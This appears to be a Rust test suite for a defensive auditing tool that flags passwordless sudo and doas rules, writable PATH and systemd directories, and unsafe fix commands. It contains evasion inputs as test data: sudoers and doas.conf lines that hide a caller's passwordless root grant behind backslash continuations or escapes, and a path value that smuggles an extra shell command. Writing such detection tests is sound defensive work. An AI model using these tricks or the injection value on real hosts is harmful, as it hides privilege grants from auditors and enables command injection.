    // Round 4, OpenDoas 6.8.2 (`doas -n true` as yamin, uid 1000, who holds gid
    // 27): `permit nopass 10\` then `00` grants uid 1000, and `permit nopass
    // :2\` then `7` grants gid 27. Joined with a space they read as uid 10 and
    // gid 2, neither the caller.
    for text in [
        &b"permit nopass 10\\\n00\n"[..],
        b"permit nopass :2\\\n7\n",
        b"permit nopass :10\\\n00\n",
        b"permit nopass 1\\\n0\\\n00\n",
        b"permit nopass 10\\\r\n00\n",
        b"permit nopass :2\\\r\n7\n",
    ] {
        let host = clean_for(caller(&[ME, 27])).file("/etc/doas.conf", 0, 0, 0o400, text);
        let report = run(&host, "/usr/bin");
        assert_maybe_never_clean(&report, &[1], &format!("{text:?}"));
    }
}

#[test]
fn denies_a_doas_keyword_spelled_with_an_escape_hiding_the_callers_rule() {
    // OpenDoas 6.8.2 drops the backslash of `\s`: `permit nopas\s yamin` is a
    // `nopass` rule for the caller, and `doas -n true` succeeds. The line holds
    // an escape aido does not model, so the rule is "maybe", never missing.
    for text in [
        &b"permit nopas\\s yamin\n"[..],
        b"permit n\\o\\p\\a\\s\\s yamin\n",
        b"permit nopass yamin \\q\n",
    ] {
        let report = run(
            &clean().file("/etc/doas.conf", 0, 0, 0o400, text),
            "/usr/bin",
        );
        assert_maybe_never_clean(&report, &[1], &format!("{text:?}"));
    }
}

/// Every way a sudoers rule can name the caller (yamin: uid 1000, gid 1000, and
/// gid 27, which `/etc/group` calls `sudo`) and remove the password.
const SUDOERS_RULES_NAMING_THE_CALLER: [&[u8]; 7] = [
    b"yamin ALL=(ALL) NOPASSWD: ALL\n",
    b"#1000 ALL=(ALL) NOPASSWD: ALL\n",
    b"%sudo ALL=(ALL) NOPASSWD: ALL\n",
    b"%#27 ALL=(ALL) NOPASSWD: ALL\n",
    b"ALL ALL=(ALL) NOPASSWD: ALL\n",
    b"Defaults:yamin !authenticate\n",
    b"Defaults !authenticate\n",
];

/// The same for a doas rule.
const DOAS_RULES_NAMING_THE_CALLER: [&[u8]; 5] = [
    b"permit nopass yamin\n",
    b"permit nopass 1000\n",
    b"permit nopass :sudo\n",
    b"permit nopass :27\n",
    b"permit nopass :1000\n",
];

/// A file the caller's passwordless rule is in, and the passwordless-rules
/// check of it: never clean, and no rule it finds is called someone else's.
fn assert_never_clean_and_never_no(file: &str, text: &[u8]) {
    let mode = if file == "/etc/doas.conf" {
        0o400
    } else {
        0o440
    };
    let host = clean_for(caller(&[ME, 27])).file(file, 0, 0, mode, text);
    let report = run(&host, "/usr/bin");
    let rules = check(&report, CheckId::PasswordlessRules);
    let note = format!("{file}: {text:?}");
    assert_ne!(rules.status, Status::Clean, "{note}");
    let found = rules_in(&report);
    assert!(!found.is_empty(), "{note}");
    assert!(
        found.iter().all(|(_, _, applies)| *applies != Applies::No),
        "{note}: {found:?}"
    );
}

#[test]
fn denies_any_line_ending_in_a_backslash_hiding_the_callers_passwordless_rule() {
    // The property, over every generated head (a rule, a comment, a quote, a
    // `#`, an escape, blanks, a carriage return, anything before the
    // backslash) and every spelling of a rule that names the caller: the
    // caller's passwordless rule is never lost (the check is never Clean) and
    // never called someone else's (no rule is `Applies::No`), in either
    // dialect, whether the rule is the very next line (joined, "maybe") or
    // follows an ordinary line (its own, "yes"), each spelling both ways.
    let heads = config::lines_ending_in_a_backslash();
    assert!(heads.len() > 500);
    for head in &heads {
        for (file, rules, ordinary) in [
            (
                "/etc/sudoers",
                &SUDOERS_RULES_NAMING_THE_CALLER[..],
                &b"alice ALL=(ALL) ALL\n"[..],
            ),
            (
                "/etc/doas.conf",
                &DOAS_RULES_NAMING_THE_CALLER[..],
                b"permit alice cmd /bin/true\n",
            ),
        ] {
            for rule in rules {
                let mut next = head.clone();
                next.extend_from_slice(rule);
                assert_never_clean_and_never_no(file, &next);

                let mut between = head.clone();
                between.extend_from_slice(ordinary);
                between.extend_from_slice(rule);
                assert_never_clean_and_never_no(file, &between);
            }
        }
    }
}

#[test]
fn a_name_this_host_cannot_resolve_is_maybe_never_names_others() {
    // A directory-service user and group, and a caller holding a gid with no
    // name: nothing here can say the rule is not the caller's.
    let host = MemoryHost::new(Caller {
        uid: 5001,
        gid: 5001,
        groups: Lookup::Found(vec![5001, 5000]),
    })
    .dir("/", 0, 0, 0o755)
    .dir("/etc", 0, 0, 0o755)
    .file("/etc/passwd", 0, 0, 0o644, b"root:x:0:0::/root:/bin/sh\n")
    .file("/etc/group", 0, 0, 0o644, b"root:x:0:\n")
    .file(
        "/etc/sudoers",
        0,
        0,
        0o440,
        b"ldapuser ALL=(ALL) NOPASSWD: ALL\n%ldapadmins ALL=(ALL) NOPASSWD: ALL\n",
    )
    .file(
        "/etc/doas.conf",
        0,
        0,
        0o400,
        b"permit nopass ldapuser\npermit nopass :ldapadmins\n",
    )
    .dir("/usr", 0, 0, 0o755)
    .dir("/usr/bin", 0, 0, 0o755);
    let report = run(&host, "/usr/bin");
    assert_eq!(
        rules_in(&report),
        vec![
            (1, Grant::Nopasswd, Applies::Maybe),
            (2, Grant::Nopasswd, Applies::Maybe),
            (1, Grant::Nopass, Applies::Maybe),
            (2, Grant::Nopass, Applies::Maybe),
        ]
    );
}

#[test]
fn denies_a_link_to_the_backend_directory_hiding_entries_ahead_of_it() {
    // `~/fakebin -> /usr/bin` first on PATH once turned the whole check off:
    // the link resolves to the backend's directory, so everything from it on
    // was "behind" the backend, `~/bin` included.
    let host = clean()
        .link("/home/yamin/fakebin", "/usr/bin")
        .dir("/home/yamin/bin", ME, ME, 0o755)
        .file("/etc/sudoers", 0, 0, 0o440, b"");
    let report = run(&host, "/home/yamin/fakebin:/home/yamin/bin:/usr/bin");
    let user = check(&report, CheckId::UserPath);
    assert_eq!(user.status, Status::Found);
    assert_eq!(user.examined, 2);
    let at: Vec<Option<(String, String, Via)>> = user.findings.iter().map(writable_at).collect();
    assert_eq!(
        at,
        vec![
            Some((
                "/home/yamin/fakebin".to_owned(),
                "/home/yamin".to_owned(),
                Via::Ancestor
            )),
            Some((
                "/home/yamin/bin".to_owned(),
                "/home/yamin".to_owned(),
                Via::Ancestor
            )),
        ]
    );
    assert!(
        user.note
            .as_deref()
            .unwrap()
            .contains("from /usr/bin on (1)")
    );
}

#[test]
fn a_clean_link_to_the_backend_directory_is_the_backend_and_is_named_in_the_note() {
    // Root owns the link and every directory it passes through, so it is the
    // backend's directory by another name, and the note names the entry that
    // was actually found rather than `/usr/bin`.
    let host = clean()
        .dir("/opt", 0, 0, 0o755)
        .link("/opt/bin", "/usr/bin")
        .dir("/home/yamin/bin", ME, ME, 0o755);
    let report = run(&host, "/opt/bin:/home/yamin/bin");
    let user = check(&report, CheckId::UserPath);
    assert_eq!(user.status, Status::Clean);
    assert_eq!(user.examined, 0);
    assert!(
        user.note
            .as_deref()
            .unwrap()
            .contains("from /opt/bin on (2)")
    );
}

#[test]
fn a_path_entry_that_cannot_be_examined_does_not_end_the_search() {
    let host = clean().fault("/usr/odd", "Input/output error (os error 5)");
    let report = run(&host, "/usr/odd:/usr/bin");
    let user = check(&report, CheckId::UserPath);
    assert_eq!(user.status, Status::Unverified);
    assert_eq!(user.examined, 1);
    assert!(
        user.note
            .as_deref()
            .unwrap()
            .contains("from /usr/bin on (1)")
    );
}

fn user_path_of(host: &MemoryHost, path: &str) -> Check {
    check(&run(host, path), CheckId::UserPath).clone()
}

fn sticky_tmp() -> MemoryHost {
    clean()
        .dir("/tmp", 0, 0, 0o1777)
        .file("/etc/sudoers", 0, 0, 0o440, b"")
}

#[test]
fn denies_a_caller_owned_link_in_a_sticky_directory_steering_a_path_entry() {
    // `PATH=/tmp/l:/usr/bin` with `/tmp/l -> /usr/sbin` owned by the caller:
    // in a sticky directory its owner may delete it and put another there.
    let host = sticky_tmp().owned_link("/tmp/l", "/usr/sbin", ME);
    let user = user_path_of(&host, "/tmp/l:/usr/bin");
    assert_eq!(user.status, Status::Found);
    assert_eq!(
        user.findings.iter().map(writable_at).collect::<Vec<_>>(),
        vec![Some((
            "/tmp/l".to_owned(),
            "/tmp/l".to_owned(),
            Via::Itself
        ))]
    );
    assert_eq!(
        writers_of(&user.findings[0]).unwrap().to_vec(),
        vec![Writer::Owner {
            uid: ME,
            name: Some("yamin".to_owned()),
            you: true
        }]
    );
}

#[test]
fn denies_a_caller_owned_link_above_the_path_entry_in_a_sticky_directory() {
    let host =
        sticky_tmp()
            .dir("/usr/sbin/real", 0, 0, 0o755)
            .owned_link("/tmp/up", "/usr/sbin", ALICE);
    let user = user_path_of(&host, "/tmp/up/real:/usr/bin");
    assert_eq!(
        user.findings.iter().map(writable_at).collect::<Vec<_>>(),
        vec![Some((
            "/tmp/up/real".to_owned(),
            "/tmp/up".to_owned(),
            Via::Ancestor
        ))]
    );
}

#[test]
fn denies_a_caller_owned_file_in_a_sticky_directory_blocking_a_path_entry() {
    // The caller can `rm /tmp/f` and `mkdir -p /tmp/f/bin`.
    let host = sticky_tmp().file("/tmp/f", ME, ME, 0o644, b"");
    let user = user_path_of(&host, "/tmp/f/bin:/usr/bin");
    assert_eq!(user.status, Status::Found);
    assert_eq!(
        user.findings.iter().map(writable_at).collect::<Vec<_>>(),
        vec![Some((
            "/tmp/f/bin".to_owned(),
            "/tmp/f".to_owned(),
            Via::Ancestor
        ))]
    );
}

#[test]
fn a_link_or_file_root_owns_in_a_sticky_directory_is_not_replaceable() {
    let host = sticky_tmp()
        .link("/tmp/rootlink", "/usr/sbin")
        .file("/tmp/rootfile", 0, 0, 0o644, b"")
        // A link its owner cannot replace, there being no sticky bit and no
        // write permission on the directory.
        .dir("/srv", 0, 0, 0o755)
        .owned_link("/srv/mine", "/usr/sbin", ME);
    for path in [
        "/tmp/rootlink:/usr/bin",
        "/tmp/rootfile/bin:/usr/bin",
        "/srv/mine:/usr/bin",
    ] {
        let user = user_path_of(&host, path);
        assert_eq!(user.status, Status::Clean, "{path}: {:?}", user.findings);
    }
}

#[test]
fn denies_a_drop_in_directory_that_is_a_link_to_a_directory_someone_fills() {
    // systemd follows `foo.service.d -> /opt/foo.d` and reads its `*.conf`.
    let host = units_host()
        .dir("/opt", 0, 0, 0o755)
        .dir("/opt/foo.d", 0, 0, 0o755)
        .file("/opt/foo.d/override.conf", ALICE, ALICE, 0o644, b"")
        .file("/opt/foo.d/fine.conf", 0, 0, 0o644, b"")
        .link("/usr/lib/systemd/system/foo.service.d", "/opt/foo.d")
        // Not named like a drop-in directory, so it is not read.
        .dir("/opt/other", 0, 0, 0o755)
        .file("/opt/other/x.conf", ALICE, ALICE, 0o644, b"")
        .link("/usr/lib/systemd/system/other.link", "/opt/other");
    let report = run(&host, "/usr/bin");
    let units = check(&report, CheckId::UnitDirectories);
    let at: Vec<Option<(String, String, Via)>> = units.findings.iter().map(writable_at).collect();
    assert!(
        at.contains(&Some((
            "/opt/foo.d/override.conf".to_owned(),
            "/opt/foo.d/override.conf".to_owned(),
            Via::Itself
        ))),
        "{at:?}"
    );
    assert!(
        !at.iter()
            .flatten()
            .any(|(path, _, _)| path.contains("/opt/other") || path.contains("fine.conf")),
        "{at:?}"
    );
}

#[test]
fn denies_a_world_writable_fifo_a_root_shell_sources() {
    // A fifo's mode bits say who writes what root reads; a character device
    // such as /dev/null holds nothing, whatever its mode.
    let host = clean()
        .dir("/etc/profile.d", 0, 0, 0o755)
        .special("/etc/profile.d/pipe.sh", 0, 0, 0o646)
        .special("/etc/profile.d/safe.sh", 0, 0, 0o644)
        .char_device("/etc/profile.d/null.sh", 0, 0, 0o666);
    let report = run(&host, "/usr/bin");
    let startup = check(&report, CheckId::RootShellStartup);
    assert_eq!(
        startup.findings.iter().map(writable_at).collect::<Vec<_>>(),
        vec![Some((
            "/etc/profile.d/pipe.sh".to_owned(),
            "/etc/profile.d/pipe.sh".to_owned(),
            Via::Itself
        ))]
    );
    assert_eq!(
        writers_of(&startup.findings[0]).unwrap().to_vec(),
        vec![Writer::Everyone]
    );
}

#[test]
fn denies_a_clean_root_path_while_a_drop_in_that_may_set_secure_path_is_unread() {
    // `/etc/sudoers` reads fine, its include does not: the last `secure_path`
    // sudo reads may be in the part nobody could open.
    let host = clean()
        .file("/etc/sudoers", 0, 0, 0o440, b"#includedir /etc/sudoers.d\n")
        .dir("/etc/sudoers.d", 0, 0, 0o755)
        .unreadable_file("/etc/sudoers.d/10-path", 0, 0, 0o440);
    let report = run(&host, "/usr/bin");
    assert_eq!(
        check(&report, CheckId::PasswordlessRules).status,
        Status::Unverified
    );
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(root_path.status, Status::Unverified);
    assert_eq!(root_path.unverified.len(), 1);
    assert_eq!(root_path.unverified[0].at, p("/etc/sudoers.d/10-path"));
    assert!(root_path.unverified[0].reason.contains("secure_path"));
}

#[test]
fn denies_blaming_an_unreadable_file_for_a_root_path_gap_in_a_file_that_was_read() {
    // `/etc/sudoers` reads fine; one line of it ends in a backslash, which aido
    // does not model, so a `secure_path` could be set on a line it did not
    // understand. The reason must say that, and must not say the file could not
    // be read or that the stock directories were examined *instead*: the
    // `secure_path` it did read is examined, and a writable directory in it is
    // found.
    let sudoers_text: &[u8] =
        b"Defaults env_keep=\"A \\\nB\"\nDefaults secure_path=\"/opt/bin:/usr/bin\"\n";
    let report = run(&sudoers(sudoers_text), "/usr/bin");
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(root_path.status, Status::Unverified);
    assert_eq!(root_path.unverified.len(), 1);
    let gap = &root_path.unverified[0];
    assert_eq!(
        (gap.path.clone(), gap.at.clone()),
        (p("/etc/sudoers"), p("/etc/sudoers"))
    );
    assert!(gap.reason.contains("does not model"), "{}", gap.reason);
    assert!(gap.reason.contains("1 such"), "{}", gap.reason);
    assert!(!gap.reason.contains("could not be read"), "{}", gap.reason);
    assert!(!gap.reason.contains("instead"), "{}", gap.reason);

    let host = sudoers(sudoers_text)
        .dir("/opt", 0, 0, 0o755)
        .dir("/opt/bin", 0, 4, 0o775);
    let report = run(&host, "/usr/bin");
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(root_path.status, Status::Found);
    assert_eq!(
        root_path
            .findings
            .iter()
            .map(writable_at)
            .collect::<Vec<_>>(),
        vec![Some((
            "/opt/bin".to_owned(),
            "/opt/bin".to_owned(),
            Via::Itself
        ))]
    );
    assert_eq!(root_path.unverified.len(), 1);
}

#[test]
fn root_path_names_each_cause_of_a_gap_once_and_counts_each_kind_apart() {
    // A drop-in that could not be read, and two files that were read with a
    // line aido does not model: two entries, one per cause, each counting its
    // own kind, and the unmodelled one names the first such file.
    let host = clean()
        .file(
            "/etc/sudoers",
            0,
            0,
            0o440,
            b"Defaults env_keep=\"A \\\nB\"\n#includedir /etc/sudoers.d\n",
        )
        .dir("/etc/sudoers.d", 0, 0, 0o755)
        .file(
            "/etc/sudoers.d/10-a",
            0,
            0,
            0o440,
            b"Defaults secure_path=\"/usr/bin\"\nalice ALL=(ALL) ALL \\\n",
        )
        .unreadable_file("/etc/sudoers.d/20-b", 0, 0, 0o440);
    let report = run(&host, "/usr/bin");
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(root_path.status, Status::Unverified);
    let gaps: Vec<(PathBuf, bool, bool)> = root_path
        .unverified
        .iter()
        .map(|gap| {
            (
                gap.at.clone(),
                gap.reason.contains("could not be read"),
                gap.reason.contains("does not model"),
            )
        })
        .collect();
    assert_eq!(
        gaps,
        vec![
            (p("/etc/sudoers.d/20-b"), true, false),
            (p("/etc/sudoers"), false, true),
        ]
    );
    assert!(root_path.unverified[0].reason.contains("1 such"));
    assert!(root_path.unverified[1].reason.contains("2 such"));
    // The passwordless-rules check lists all three files, as what each is.
    let rules = check(&report, CheckId::PasswordlessRules);
    assert_eq!(rules.unverified.len(), 3);
}

#[test]
fn an_unreadable_sudoers_and_an_unmodelled_drop_in_are_both_said_for_root_path() {
    // `/etc/sudoers` could not be read, and a drop-in that was has a line aido
    // does not model: the first is the unread entry (which also stands for any
    // other file that could not be read), the second is its own.
    let host = clean()
        .unreadable_file("/etc/sudoers", 0, 0, 0o440)
        .dir("/etc/sudoers.d", 0, 0, 0o755)
        .file(
            "/etc/sudoers.d/10-a",
            0,
            0,
            0o440,
            b"alice ALL=(ALL) ALL \\\n",
        );
    let report = run(&host, "/usr/bin");
    let root_path = check(&report, CheckId::RootPath);
    assert_eq!(root_path.status, Status::Unverified);
    let gaps: Vec<(PathBuf, bool, bool)> = root_path
        .unverified
        .iter()
        .map(|gap| {
            (
                gap.at.clone(),
                gap.reason.contains("could not be read"),
                gap.reason.contains("does not model"),
            )
        })
        .collect();
    assert_eq!(
        gaps,
        vec![
            (p("/etc/sudoers"), true, false),
            (p("/etc/sudoers.d/10-a"), false, true),
        ]
    );
}

#[test]
fn denies_a_clean_root_path_while_the_sudo_rs_file_is_unreadable() {
    let host = clean().unreadable_file("/etc/sudoers-rs", 0, 0, 0o440);
    let report = run(&host, "/usr/bin");
    assert_eq!(check(&report, CheckId::RootPath).status, Status::Unverified);
}

#[test]
fn denies_proposing_chmod_of_tmp_for_a_missing_path_entry_under_it() {
    // `PATH=/tmp/nothing-here:/usr/bin`: the entry is missing, the report says
    // it can be created in /tmp, and the fix is to take it off the PATH.
    let host = units_host()
        .file("/usr/bin/chmod", 0, 0, 0o755, b"")
        .file("/usr/bin/chown", 0, 0, 0o755, b"")
        .dir("/tmp", 0, 0, 0o1777);
    let report = run(&host, "/tmp/nothing-here:/usr/bin");
    assert_eq!(
        check(&report, CheckId::UserPath).findings.len(),
        1,
        "{:?}",
        check(&report, CheckId::UserPath)
    );
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    assert!(
        proposals
            .iter()
            .any(|p| p.title == "take /tmp/nothing-here off your PATH")
    );
    assert!(
        !proposals
            .iter()
            .flat_map(|p| p.commands.iter().flatten())
            .any(|word| word == "/tmp"),
        "{proposals:?}"
    );
}

#[test]
fn denies_a_printed_command_naming_a_path_that_fish_would_split() {
    // The quoted form of `/srv/a\';echo INJECTED;\'` is one word to sh, bash,
    // and zsh, and two commands to fish. No command is printed for it.
    let hostile = "/srv/a\\';echo INJECTED;\\'";
    let host = units_host().file("/usr/bin/chmod", 0, 0, 0o755, b"").file(
        "/usr/bin/chown",
        0,
        0,
        0o755,
        b"",
    );
    let mut report = run(&host, "/usr/bin");
    report
        .checks
        .retain(|c| c.check != CheckId::UnitDirectories);
    report.checks.push(Check {
        check: CheckId::UnitDirectories,
        status: Status::Found,
        examined: 1,
        findings: vec![Finding::Writable {
            path: p(hostile),
            at: p(hostile),
            via: Via::Itself,
            writers: vec![Writer::Everyone],
            shadows: None,
        }],
        unverified: Vec::new(),
        note: None,
    });
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    let hostile_one = proposals
        .iter()
        .find(|p| p.title.contains("INJECTED"))
        .unwrap();
    assert!(hostile_one.commands.is_empty(), "{hostile_one:?}");
    assert!(hostile_one.by_hand.is_some());
}

#[test]
fn denies_chown_of_a_home_directory_when_passwd_cannot_say_which_it_is() {
    // `/etc/passwd` unreadable: the conventional places for a home directory
    // are still not handed to root, and a non-conventional one named there is.
    let host = units_host()
        .file("/usr/bin/chmod", 0, 0, 0o755, b"")
        .file("/usr/bin/chown", 0, 0, 0o755, b"")
        .unreadable_file("/etc/passwd", 0, 0, 0o600)
        .dir("/srv", 0, 0, 0o755)
        .dir("/srv/svc", ALICE, ALICE, 0o755)
        .link(
            "/usr/lib/systemd/system/svc.service",
            "/srv/svc/svc.service",
        )
        .file("/srv/svc/svc.service", ALICE, ALICE, 0o644, b"");
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    assert!(
        proposals
            .iter()
            .any(|p| p.title.contains("out of /home/yamin")),
        "{proposals:?}"
    );
    assert!(
        !proposals
            .iter()
            .flat_map(|p| p.commands.iter().flatten())
            .any(|word| word == "/home/yamin"),
        "{proposals:?}"
    );
    // Unknowable without the file: this one is not a convention, and is
    // offered back to root like any directory root trusts.
    assert!(
        proposals
            .iter()
            .flat_map(|p| p.commands.iter().flatten())
            .any(|word| word == "/srv/svc"),
        "{proposals:?}"
    );
}

#[test]
fn a_home_named_by_passwd_off_the_convention_is_not_handed_to_root() {
    let passwd = [PASSWD, b"svc:x:1005:1005::/srv/svc:/bin/false\n"].concat();
    let host = units_host()
        .file("/usr/bin/chown", 0, 0, 0o755, b"")
        .file("/etc/passwd", 0, 0, 0o644, &passwd)
        .dir("/srv", 0, 0, 0o755)
        .dir("/srv/svc", 1005, 1005, 0o755)
        .link(
            "/usr/lib/systemd/system/svc.service",
            "/srv/svc/svc.service",
        )
        .file("/srv/svc/svc.service", 1005, 1005, 0o644, b"");
    let report = run(&host, "/usr/bin");
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    assert!(
        proposals
            .iter()
            .any(|p| p.title.contains("out of /srv/svc")),
        "{proposals:?}"
    );
}

#[test]
fn a_finding_of_another_kind_in_the_user_path_check_is_ignored_not_misread() {
    let host = units_host();
    let mut report = run(&host, "/usr/bin");
    let group = Finding::GroupMembership {
        group: "docker".to_owned(),
        gid: 999,
        passwordless: true,
        grants: String::new(),
        listed: true,
        active: true,
    };
    let rule = Finding::PasswordlessRule {
        file: p("/etc/sudoers"),
        line: 1,
        text: String::new(),
        grant: Grant::Nopasswd,
        applies_to_you: Applies::Yes,
    };
    report.checks.retain(|c| c.check != CheckId::UserPath);
    report.checks.push(Check {
        check: CheckId::UserPath,
        status: Status::Found,
        examined: 0,
        findings: vec![group, rule],
        unverified: Vec::new(),
        note: None,
    });
    let proposals = propose(&host, &report, Some("/usr/bin/sudo"));
    assert!(proposals.iter().all(|p| !p.id.starts_with("fix-path")));
}
